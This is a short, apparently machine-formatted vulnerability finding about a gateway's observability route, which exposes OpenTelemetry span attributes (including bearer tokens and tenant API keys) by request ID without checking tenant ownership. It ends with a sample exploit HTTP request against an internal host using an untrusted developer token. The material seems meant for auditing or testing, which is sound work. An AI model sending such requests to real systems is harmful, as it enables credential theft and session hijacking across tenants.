diagnosis: The observability route exposes OpenTelemetry request span attributes by requestId without asserting ownership or tenant isolation. Span attributes recorded by gateway instrumentation contain sensitive authentication headers, bearer tokens, and tenant API keys, allowing an attacker to harvest credentials and hijack sessions across tenants.
exploit_request:
GET /api/observability/requests/req_gateway_auth_991840 HTTP/1.1
Host: gateway.cloud.internal:8087
Authorization: Bearer <untrusted_developer_jwt>
Accept: application/json
